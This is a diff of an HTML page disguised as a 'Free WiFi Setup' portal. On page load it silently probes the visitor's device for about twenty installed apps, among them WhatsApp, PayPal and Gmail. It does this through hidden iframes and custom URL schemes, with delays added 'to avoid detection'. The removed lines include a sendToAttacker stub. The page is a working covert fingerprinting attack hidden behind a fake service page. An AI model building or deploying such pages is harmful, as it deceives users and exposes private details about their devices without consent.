@@ -2,53 +2,206 @@
 <html>
 <head>
     <title>Free WiFi Setup</title>
+    <style>
+        #result {
+            background: #f0f0f0;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            font-family: monospace;
+        }
+        .app-status {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid #ccc;
+        }
+        .installed {
+            border-left-color: green;
+            background: #e8f5e8;
+        }
+        .not-installed {
+            border-left-color: #ccc;
+            background: #f9f9f9;
+        }
+    </style>
 </head>
 <body>
-    <h2>Connecting to Free WiFi...</h2>
+    <h2>Free WiFi Connection</h2>
+    <p>Setting up your connection...</p>
     
+    <div id="result">
+        Detection in progress...
+    </div>
+
     <script>
-        const appSchemes = [
-          'intent://twitter.com/#Intent;scheme=twitter;package=com.twitter.android;end',
-          'intent://facebook.com/#Intent;scheme=fb;package=com.facebook.katana;end',
-          'intent://instagram.com/#Intent;scheme=instagram;package=com.instagram.android;end',
-          'intent://whatsapp.com/#Intent;scheme=whatsapp;package=com.whatsapp;end',
+        // Comprehensive list of app intent schemes and package names
+        const appsToProbe = [
+            { name: "WhatsApp", scheme: "whatsapp://", package: "com.whatsapp" },
+            { name: "Facebook", scheme: "fb://", package: "com.facebook.katana" },
+            { name: "Instagram", scheme: "instagram://", package: "com.instagram.android" },
+            { name: "Twitter", scheme: "twitter://", package: "com.twitter.android" },
+            { name: "Spotify", scheme: "spotify://", package: "com.spotify.music" },
+            { name: "Netflix", scheme: "nflx://", package: "com.netflix.mediaclient" },
+            { name: "Amazon", scheme: "amzn://", package: "com.amazon.mShop.android.shopping" },
+            { name: "PayPal", scheme: "paypal://", package: "com.paypal.android.p2pmobile" },
+            { name: "Gmail", scheme: "googlemail://", package: "com.google.android.gm" },
+            { name: "YouTube", scheme: "youtube://", package: "com.google.android.youtube" },
+            { name: "Chrome", scheme: "googlechrome://", package: "com.android.chrome" },
+            { name: "Telegram", scheme: "tg://", package: "org.telegram.messenger" },
+            { name: "Snapchat", scheme: "snapchat://", package: "com.snapchat.android" },
+            { name: "LinkedIn", scheme: "linkedin://", package: "com.linkedin.android" },
+            { name: "TikTok", scheme: "tiktok://", package: "com.zhiliaoapp.musically" },
+            { name: "Discord", scheme: "discord://", package: "com.discord" },
+            { name: "Reddit", scheme: "reddit://", package: "com.reddit.frontpage" },
+            { name: "Uber", scheme: "uber://", package: "com.ubercab" },
+            { name: "Google Maps", scheme: "google.navigation://", package: "com.google.android.apps.maps" },
+            { name: "Google Drive", scheme: "googledrive://", package: "com.google.android.apps.docs" }
         ];
 
         let detectedApps = [];
+        let checkedCount = 0;
+        const totalApps = appsToProbe.length;
 
-        function probeApps() {
-            appSchemes.forEach((scheme, index) => {
-                setTimeout(() => {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = scheme;
-                    iframe.style.display = 'none';
-                    
-                    iframe.onload = () => {
-                        detectedApps.push(scheme);
-                        console.log('App detected:', scheme);
-                    };
-                    
-                    document.body.appendChild(iframe);
-                    
-                    // Remove iframe after check
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                    }, 1000);
-                    
-                }, index * 200);
+        function updateStatus() {
+            const resultDiv = document.getElementById('result');
+            const progress = Math.round((checkedCount / totalApps) * 100);
+            
+            let statusHTML = `<h3>Scan Progress: ${progress}%</h3>`;
+            statusHTML += `<div>Checked ${checkedCount} of ${totalApps} apps</div>`;
+            
+            // Show detected apps
+            if (detectedApps.length > 0) {
+                statusHTML += `<h4>Detected Apps:</h4>`;
+                detectedApps.forEach(app => {
+                    statusHTML += `<div class="app-status installed">✅ ${app.name}</div>`;
+                });
+            }
+            
+            // Show apps being checked
+            appsToProbe.forEach(app => {
+                if (!detectedApps.find(a => a.name === app.name)) {
+                    statusHTML += `<div class="app-status not-installed">⏳ Checking ${app.name}...</div>`;
+                }
             });
-
-            // Send results to attacker after all probes
-            setTimeout(() => {
-                sendToAttacker(detectedApps);
-            }, appSchemes.length * 200 + 1000);
+            
+            resultDiv.innerHTML = statusHTML;
         }
 
-        function sendToAttacker(apps) {
-            // Send detected apps to attacker server
-            console.log("detected", apps)
+        function probeApp(app) {
+            return new Promise((resolve) => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.style.width = '0';
+                iframe.style.height = '0';
+                iframe.style.border = 'none';
+                
+                let appDetected = false;
+                const timeout = setTimeout(() => {
+                    // If iframe doesn't load quickly, app is probably not installed
+                    document.body.removeChild(iframe);
+                    resolve(false);
+                }, 100);
+
+                iframe.onload = () => {
+                    clearTimeout(timeout);
+                    // Quick load usually means app is NOT installed
+                    document.body.removeChild(iframe);
+                    resolve(false);
+                };
+
+                // Alternative method using error handling
+                iframe.onerror = () => {
+                    clearTimeout(timeout);
+                    document.body.removeChild(iframe);
+                    resolve(false);
+                };
+
+                // Try to detect if app intercepts the intent
+                window.addEventListener('blur', function blurHandler() {
+                    clearTimeout(timeout);
+                    window.removeEventListener('blur', blurHandler);
+                    appDetected = true;
+                    document.body.removeChild(iframe);
+                    resolve(true);
+                });
+
+                document.body.appendChild(iframe);
+                iframe.src = app.scheme;
+
+                // Fallback detection
+                setTimeout(() => {
+                    if (!appDetected) {
+                        clearTimeout(timeout);
+                        document.body.removeChild(iframe);
+                        resolve(false);
+                    }
+                }, 500);
+            });
         }
-        window.onload = probeApps;
+
+        async function startDetection() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = 'Starting silent app detection...';
+            
+            for (let i = 0; i < appsToProbe.length; i++) {
+                const app = appsToProbe[i];
+                
+                try {
+                    const isInstalled = await probeApp(app);
+                    
+                    if (isInstalled) {
+                        detectedApps.push(app);
+                    }
+                    
+                    checkedCount++;
+                    updateStatus();
+                    
+                    // Small delay between probes to avoid detection
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                    
+                } catch (error) {
+                    checkedCount++;
+                    updateStatus();
+                }
+            }
+            
+            // Final results
+            showFinalResults();
+        }
+
+        function showFinalResults() {
+            const resultDiv = document.getElementById('result');
+            
+            let finalHTML = `<h3>📊 Detection Complete</h3>`;
+            finalHTML += `<div>Scanned ${totalApps} applications</div>`;
+            finalHTML += `<div>Found ${detectedApps.length} installed apps</div>`;
+            finalHTML += `<hr>`;
+            
+            if (detectedApps.length > 0) {
+                finalHTML += `<h4>✅ Installed Apps:</h4>`;
+                detectedApps.forEach(app => {
+                    finalHTML += `<div class="app-status installed">
+                        <strong>${app.name}</strong><br>
+                        <small>Package: ${app.package}</small>
+                    </div>`;
+                });
+            }
+            
+            finalHTML += `<h4>❌ Not Installed:</h4>`;
+            appsToProbe.forEach(app => {
+                if (!detectedApps.find(a => a.name === app.name)) {
+                    finalHTML += `<div class="app-status not-installed">${app.name}</div>`;
+                }
+            });
+            
+            resultDiv.innerHTML = finalHTML;
+        }
+
+        // Start detection when page loads
+        window.addEventListener('load', () => {
+            setTimeout(startDetection, 1000);
+        });
     </script>
 </body>
 </html>
